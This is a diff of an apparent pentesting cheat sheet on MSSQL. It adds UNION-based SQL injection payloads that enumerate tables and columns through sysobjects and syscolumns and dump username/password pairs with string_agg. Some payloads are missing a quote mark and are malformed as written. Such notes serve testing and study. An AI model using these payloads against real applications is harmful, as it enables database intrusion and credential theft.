@@ -1,4 +1,5 @@
 # MSSQL
+## CLI
 Get databases:
 ```
 select name from sys.databases;
@@ -14,6 +15,29 @@ select * from <db-name>..<table-name>;
 ```
 select * from <db-name>.dbo.<table-name>;
 ```
+
+## Injection
+Get tables:
+```
+1' union select 1,name,id,4,5,6 from <dbname>..sysobjects where xtype=u-- -
+```
+Concat different things into one:
+```
+1' union select 1,concat(name,':',id),id,4,5,6 from <dbname>..sysobjects where xtype=u-- -
+```
+Instead of `GROUP_CONCAT` we use `string_agg`:
+```
+1' union select 1,(select string_agg(concat(name,':',id),|')),id,4,5,6 from <dbname>..sysobjects where xtype=u-- -
+```
+Getting columns:
+```
+1' union select 1,(select string_agg(name,'|')),id,4,5,6 from <tablename>..syscolumns where id=<table-id-that-we-get-above>-- -
+```
+Dump data:
+```
+1' union select 1,(select string_agg(concat(username,'/',password),|') from <db-name>..<table-name>),3,4,5,6-- -
+```
+
 Some useful variables:
 ```
 @@version
@@ -23,10 +47,10 @@ user
 
 # Current DB
 db_name()
+
 # You can increase number
 db_name(0)
 db_name(1)
-
 ```
 
 # Command Injection
